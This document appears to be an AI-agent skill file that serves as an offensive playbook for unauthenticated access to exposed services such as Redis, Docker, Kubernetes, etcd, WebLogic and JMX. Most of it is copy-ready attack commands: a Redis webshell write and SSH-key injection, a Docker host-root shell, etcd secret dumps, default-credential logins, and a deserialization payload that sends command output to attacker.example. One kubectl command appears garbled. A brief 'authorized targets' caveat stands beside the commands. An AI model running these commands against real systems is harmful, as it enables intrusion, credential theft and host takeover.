---
name: unauthorized-access-common-services
description: >-
  Exposed and unauthenticated common-service access playbook. Use when testing
  network-exposed management planes, middleware ports, datastores, and
  orchestration APIs that were never meant to be reachable without auth.
---

# SKILL: Unauthorized Access to Common Services — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Covers unauthenticated or weakly-protected access to services commonly left exposed on internal/cloud networks: Java RMI Registry, WebLogic T3/IIOP, AJP (Ghostcat), JMX consoles, Elasticsearch, Redis, MongoDB, Memcached, Docker Engine API, Kubernetes API/etcd, message brokers, and dev databases. Each entry gives port fingerprints, unauth access proof, and the chaining pivot. Use only against authorized targets.

---

## 0. RELATED ROUTING

Use this skill when recon surfaces an open service port that should not be public. Also load:

- [recon-for-sec](../recon-for-sec/SKILL.md) — port/service scanning that discovers these endpoints
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — RMI/T3/WebLogic deserialization pivots into gadget-chain exploitation
- [jndi-injection](../jndi-injection/SKILL.md) — JNDI lookups exposed via JMX/RMI
- [cloud-security-audit](../cloud-security-audit/SKILL.md) — cloud-native variants (metadata, IMDS, managed service exposure)
- [network-penetration-testing](../network-penetration-testing/SKILL.md) — broader network exploitation context

---

## 1. WHY THIS MATTERS

Services designed for trusted internal networks are routinely exposed to the internet or reachable from a compromised jump host. The failure is rarely a clever logic flaw — it is missing network segmentation plus default no-auth or factory credentials. Impact ranges from data theft to full RCE via the service's native protocol.

**Recon trigger**: any open port below that is reachable = a finding. Confirm with a harmless read-only interaction before escalating.

| Port(s) | Service | Typical unauth impact |
|---|---|---|
| 1099, 1098 | Java RMI Registry | Enumerate + bind → deserialization RCE |
| 7001, 7002 | WebLogic T3/IIOP | Deserialization RCE |
| 8009 | AJP (Tomcat) | Ghostcat LFI / AJP proxy abuse |
| 1099, 4848, 8686 | JMX / GlassFish admin | RCE via MBean |
| 9200, 9300 | Elasticsearch | Read/modify all indices |
| 6379 | Redis | Read keys, write webshell, RCE |
| 27017 | MongoDB | Full DB read/write |
| 11211 | Memcached | Cache read, amplification DDoS |
| 2375, 2376 | Docker Engine API | Container escape → host RCE |
| 6443, 10250 | Kubernetes API / kubelet | Cluster takeover |
| 2379, 2380 | etcd | Read secrets, config |
| 9042 | Cassandra | DB read/write |
| 5984 | CouchDB | DB read/write, RCE history |
| 5601, 9200 | Kibana / ES | Saved-object RCE |
| 8161, 61616 | ActiveMQ Console/JMS | Console creds, JMS deserialization |
| 15672, 5672 | RabbitMQ Mgmt/AMQP | Queue read, default creds |
| 9000, 9001 | SonarQube, etc. | Admin default creds |

---

## 2. JAVA RMI REGISTRY (1099)

RMI exposes a registry that lists bound remote objects. With no auth (the default for many legacy deployments), an attacker can enumerate objects and exploit deserialization.

```bash
# Enumerate bound names
nmap -sV -p 1099 --script rmi-dumpregistry <target>
# or with metasploit-style tooling
msfconsole -q -x "use auxiliary/scanner/misc/java_rmi_server; set RHOSTS <target>; run"

# Enumerate with remote-method-guesser
rmg enum <target> 1099
rmg guess <target> 1099            # guess exposed methods
```

**Exploitation**: legacy RMI Registry servers deserialize any object sent via the DGC/registry layer. Send a ysoserial gadget:

```bash
# RCE via registry deserialization (legacy, pre-patch)
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.example/$(id|base64)' | \
  remote-method-guesser call <target> 1099
# or metasploit
use exploit/multi/misc/java_rmi_server
```

**Modern defense (JEP 290)**: servers filter deserialization by allow-list, but `remote-method-guesser` `rmg scan` reports the filter; bypass via gadget chains on the allow-list (e.g., JDK-only chains) or exploit an exposed application-level method (`rmg guess`) that takes attacker objects.

---

## 3. WEBLOGIC T3 / IIOP (7001)

WebLogic's T3 protocol is a frequent RCE vector. Confirm the service, then chain a deserialization exploit.

```bash
# Fingerprint
nmap -p 7001,7002 --script weblogic-t3-info <target>
curl -s http://<target>:7001/ | grep -i weblogic

# Common unauth console + deserialization CVEs to verify (after confirming scope):
#  - /_async/ async response deserialization
#  - T3 protocol deserialization (ysoserial JRMP client)
java -cp ysoserial.jar ysoserial.exploit.JRMPClient <target> 7001 CommonsCollections6
```

If the admin console (`/console`) is exposed, attempt default credentials (`weblogic/welcome1`, `weblogic/weblogic`) and deploy a WAR.

---

## 4. APACHE AJP — GHOSTCAT (8009)

Tomcat's AJP connector is sometimes exposed. AJP is a binary protocol; with no secret configured (`secret=""`, the pre-9.0.31 default), an attacker can make Tomcat serve arbitrary webapp files and attributes — Ghostcat (CVE-2020-1938).

```bash
# Fingerprint + exploit
nmap -p 8009 --script ajp-headers,ajp-request <target>
# Ghostcat PoC (read WEB-INF/web.xml)
python3 ajpShooter.py http://<target>:8009 8009 /WEB-INF/web.xml read
```

When AJP is reachable and an application ships a JSP, AJP can be abused to turn an LFI into RCE by pointing the request at a controllable servlet path.

---

## 5. JMX / JAVA MANAGEMENT (1099, 4848, 8686)

JMX consoles (JConsole/JMX over RMI, GlassFish admin) often ship without auth. Unauth JMX = RCE: deploy an MBean that runs arbitrary commands.

```bash
# Fingerprint
nmap -sV -p 1099,4848,8686 <target>
nmap --script jmx-info <target>

# Exploit with beanshooter
java -jar beanshooter.jar <target> 1099 enum
java -jar beanshooter.jar <target> 1099 deploy <jar> <objectName>   # deploy MBean
java -jar beanshooter.jar <target> 1099 exec <objectName> 'id'
# metasploit
use exploit/multi/misc/jmx_invocation_handler
```

GlassFish 4848: try `admin/adminadmin` default; deploy an app via the admin REST API.

---

## 6. ELASTICSEARCH (9200, 9300)

Elasticsearch prior to requiring security by default exposed an unauth HTTP API on 9200.

```bash
# Confirm + enumerate
curl http://<target>:9200/
curl http://<target>:9200/_cat/indices?v
curl http://<target>:9200/_search?pretty
curl 'http://<target>:9200/_search?q=password:*&pretty'   # hunt secrets
# Dump a specific index
curl http://<target>:9200/users/_search?size=10000&pretty
```

Scripting: older versions allow `_script` (groovy/painless) → RCE via `Runtime.getRuntime().exec`. Kibana (5601) saved-objects / Canvas / Vega can also pivot to RCE on unauth installs.

---

## 7. REDIS (6379)

Unauth Redis is a high-impact finding: webshell writes, SSH key injection, cron RCE, and in 4.x+ module-load RCE.

```bash
# Confirm
redis-cli -h <target> -p 6379 INFO
redis-cli -h <target> -p 6379 CONFIG GET dir

# Read arbitrary keys / scan
redis-cli -h <target> --scan
redis-cli -h <target> GET <key>

# Webshell (if web root known)
redis-cli -h <target> config set dir /var/www/html
redis-cli -h <target> config set dbfilename shell.php
redis-cli -h <target> set x '<?php system($_GET["c"]); ?>'
redis-cli -h <target> save
# → http://<target>/shell.php?c=id

# SSH authorized_keys injection
redis-cli -h <target> config set dir /root/.ssh
redis-cli -h <target> config set dbfilename authorized_keys
redis-cli -h <target> set x '\n<your pubkey>\n'
redis-cli -h <target> save

# RCE via malicious module (Redis >= 4)
redis-cli -h <target> module load /tmp/exp.so   # after delivering the .so
redis-cli -h <target> system.exec 'id'
```

---

## 8. MONGODB (27017) & CASSANDRA (9042)

```bash
# MongoDB
mongosh mongodb://<target>:27017 --eval 'db.adminCommand({listDatabases:1})'
mongosh mongodb://<target>:27017/<db> --eval 'db.users.find().limit(10)'

# Cassandra (no auth, default)
cqlsh <target> 9042
cqlsh> DESCRIBE KEYSPACES;
cqlsh> SELECT * FROM system_auth.roles;
```

---

## 9. DOCKER ENGINE API (2375, 2376)

`dockerd -H tcp://0.0.0.0:2375` without TLS/auth = instant host RCE.

```bash
# Confirm
curl http://<target>:2375/version
curl http://<target>:2375/containers/json

# RCE: mount host root into a container, then chroot
curl -X POST http://<target>:2375/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host","sh"],"HostConfig":{"Binds":["/:/host"]}}'
# start it, attach → root shell on the host
docker -H tcp://<target>:2375 run -it -v /:/host alpine chroot /host sh
```

Also enumerate `secrets`, `configs`, and Swarm join tokens via the API.

---

## 10. KUBERNETES API / KUBELET / ETCD

An exposed K8s API (6443) or kubelet (10250) without auth is cluster takeover.

```bash
# API server unauth
curl -k https://<target>:6443/api/v1/namespaces
curl -k https://<target>:6443/api/v1/pods
# create a privileged pod mounting host root
kubectl --server=https://<target>:6443 --insecure-skip-tls-apply

# Kubelet API (10250) — run command in a pod, often unauth on managed nodes
curl -k https://<target>:10250/pods
curl -k -XPOST "https://<target>:10250/run/<ns>/<pod>/<container>" -d "cmd=id"

# etcd (2379) — cluster brain, stores secrets
ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only
ETCDCTL_API=3 etcdctl --endpoints=http://<target>:2379 get /secrets --prefix
```

---

## 11. MESSAGE BROKERS & MISC

```bash
# ActiveMQ (8161 console default admin/admin; 61616 JMS)
curl http://<target>:8161/admin/        # try admin/admin
# JMS deserialization via OpenWire (CVE-2015-5254 etc.)

# RabbitMQ (15672 default guest/guest restricted to localhost — test remote bypass)
curl -u guest:guest http://<target>:15672/api/queues

# Memcached (11211)
echo -e 'stats\r\n' | nc <target> 11211
printf 'get %s\r\n' <key> | nc <target> 11211
```

---

## 12. TESTING CHECKLIST

```
□ Map all open ports (recon-for-sec output); flag any management/datastore port
□ For each service, confirm reachability with a harmless read (INFO/version/list)
□ Document the no-auth/default-cred access as the finding (impact = data/host)
□ Java RMI 1099: rmg enum + guess; test legacy deserialization; check JEP 290 filter
□ WebLogic 7001: T3 fingerprint; test async/console; default creds on /console
□ AJP 8009: nmap ajp scripts; Ghostcat read of WEB-INF/web.xml
□ JMX: beanshooter enum → deploy MBean → exec
□ ES 9200: _cat/indices + _search; check scripting for RCE
□ Redis 6379: INFO, CONFIG GET dir; webshell / ssh / module-load PoC
□ MongoDB/Cassandra: list DBs/tables; sample sensitive rows
□ Docker 2375: /version + run privileged container mounting host /
□ K8s 6443/10250/2379: list pods; kubelet exec; etcd dump secrets
□ Brokers: ActiveMQ/RabbitMQ default creds + JMS deserialization
□ Chain upward: host RCE → pivot to internal network (route to network-pentest)
□ Verify remediation: service is not reachable unauthenticated; network segmentation enforced
```

---

## 13. NEXT ROUTING

- Discovery of these ports: [recon for sec](../recon-for-sec/SKILL.md)
- Deserialization pivots (RMI/T3/WebLogic): [deserialization insecure](../deserialization-insecure/SKILL.md)
- JNDI lookups via JMX/RMI: [jndi injection](../jndi-injection/SKILL.md)
- Cloud-managed variants & metadata: [cloud security audit](../cloud-security-audit/SKILL.md)
- Broader network exploitation post-access: [network penetration testing](../network-penetration-testing/SKILL.md)

---

## 14. 2026 EMERGING TECHNIQUES

### 14.1 Docker Engine — CVE-2026-34040 (CVSS 8.8) AuthZ Bypass

Authorization plugin (AuthZ) bypass; an incomplete fix for CVE-2024-41110. A specially crafted API request makes the Docker daemon forward the request to the AuthZ plugin **without the body**; the plugin may then allow a request it would have denied had the body been present. Anyone depending on AuthZ plugins that introspect the request body for access-control decisions is impacted.

```bash
# CVE-2026-34040: Docker AuthZ bypass
# The request body is stripped before the AuthZ plugin sees it
# Test: send a privileged operation with body that would be denied
curl -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
# If AuthZ plugin checks body → it receives empty body → may allow
```

### 14.2 Argo CD Repo-Server — Unauthenticated RCE → Cluster Takeover

Disclosed July 2026 by Synacktiv. The repo-server component (reads Git repos, builds K8s manifests) exposes an internal **gRPC service with no authentication**; anyone who can reach it sends a crafted request to execute commands by abusing `kustomize`. Demonstrated against Argo CD v2.13.3; reported January 2025 and **still unpatched 18 months later** → full Kubernetes cluster takeover.

```bash
# Argo CD repo-server unauthenticated RCE
# Target: Argo CD repo-server gRPC (default port 8041, no auth)
# 1. Send crafted gRPC request with malicious kustomize build
# 2. kustomize executes arbitrary commands during manifest building
# 3. Full cluster takeover via Kubernetes RBAC

# Detection: check if repo-server port is reachable
nmap -p 8041 argocd-server.internal
# If open and unauthenticated → vulnerable
```

### 14.3 etcd — RBAC Bypass in Transactions (May 2026)

An authenticated user can bypass RBAC authorization checks when reading data via `PrevKv` or attaching leases inside `Put` requests nested in etcd transactions. Fixed in **v3.6.11 and v3.5.30**.

```bash
# etcd RBAC bypass via transactions
# Authenticated low-priv user reads secrets via PrevKv
etcdctl --endpoints=https://etcd:2379 \
  --user=lowpriv:password \
  txn <<EOF
put /secret/key "temp"
get --prefix /secrets/
EOF
# Transaction wraps the read in a put → RBAC check may be bypassed
```

### 14.4 Exposed AI/ML Services — The Defining New Attack Surface (2025-2026)

This is the fastest-growing exposed-service category. CSA identified five architectural vulnerability patterns across LMDeploy, vLLM, TGI, SGLang, NVIDIA Triton, Meta Llama Stack, and Ollama:

1. **External-fetch endpoints with no URL validation (SSRF)**
2. Unsafe deserialization over IPC
3. Hardcoded trust boundaries overriding operator security settings
4. **Missing default authentication on management interfaces**
5. Memory-unsafe parsing of attacker-controlled multimodal inputs

| Service | CVE/Vector | CVSS | Impact |
|---|---|---|---|
| SGLang | CVE-2026-5760 (GGUF SSTI→RCE) | 9.8 | Crafted GGUF model file with Jinja2 template → RCE |
| SGLang | CVE-2026-3059/3060 (pickle RCE) | 9.8 | Unauthenticated RCE via `pickle.loads()` in ZMQ transport |
| LMDeploy | Vision-loader SSRF | — | Image-loading helper fetches arbitrary URLs → cloud metadata theft |
| Jupyter | Exposed notebook server | — | Token bypass → RCE via notebook execution |
| MLflow | Exposed tracking server | — | Arbitrary file read / artifact injection |

```bash
# Detect exposed AI/ML services
# SGLang (default port 30000)
nmap -p 30000 target.com
curl http://target.com:30000/v1/models

# Jupyter (default port 8888)
curl http://target.com:8888/api/status
# Check if token is required: curl http://target.com:8888/tree

# MLflow (default port 5000)
curl http://target.com:5000/api/2.0/mlflow/experiments/list

# vLLM (default port 8000)
curl http://target.com:8000/v1/models

# Ray Dashboard (default port 8265)
curl http://target.com:8265
# Ray Dashboard RCE: submit malicious job
```

### 14.5 IMDSv2 Bypass — Axios CVE-2026-40175

IMDSv2 requires a `PUT` to acquire a session token, which classic GET-only SSRF cannot perform. **CVE-2026-40175** in Axios enables **header injection**, allowing a GET-based SSRF to craft the required `PUT` request → IMDSv2 bypass. Compounding this, IMDSv2 is **not enforced by default** on EC2; thousands of instances still run in IMDSv1 fallback mode.

### 14.6 PCPJack Worm — CVE-2025-55182 (CVSS 10.0) + 4 others

A new credential-theft framework (SentinelOne, May 2026) targeting exposed **Docker, Kubernetes, Redis, MongoDB, RayML** and vulnerable web apps, spreading worm-like and moving laterally. It harvests credentials from cloud, container, developer, productivity, and financial services. The worm also leverages **React2Shell (CVE-2025-55182)**, a React/Next.js server-side deserialization RCE.

### 14.7 Redis CVE-2026-23479 — AI-Discovered RCE

An AI-discovered RCE backdoor dormant for ~2 years in Redis code, affecting millions of cloud instances. Combined with the still-heavily-exploited CVE-2022-0543 (Lua sandbox escape, CVSS 10.0), Redis remains a top target.

### 14.8 2026 Exposed Services Quick Reference

| Service | Port | 2026 CVE/Vector | Impact |
|---|---|---|---|
| Docker Engine | 2375/2376 | CVE-2026-34040 AuthZ bypass | Container escape / privileged access |
| Argo CD repo-server | 8041 | Unauthenticated gRPC RCE | K8s cluster takeover |
| etcd | 2379 | RBAC bypass in transactions (May 2026) | Secret read with low priv |
| SGLang | 30000 | CVE-2026-5760 / 3059/3060 | Unauthenticated RCE (9.8) |
| LMDeploy | varies | Vision-loader SSRF | Cloud metadata theft |
| Jupyter | 8888 | Exposed notebook (no auth) | RCE via code execution |
| MLflow | 5000 | Exposed tracking server | File read / artifact injection |
| Ray | 8265 | Dashboard RCE | Cluster takeover |
| Redis | 6379 | CVE-2026-23479 / CVE-2022-0543 | RCE / sandbox escape |
| MongoDB | 27017 | No auth (mass exploitation) | Data theft / ransom |
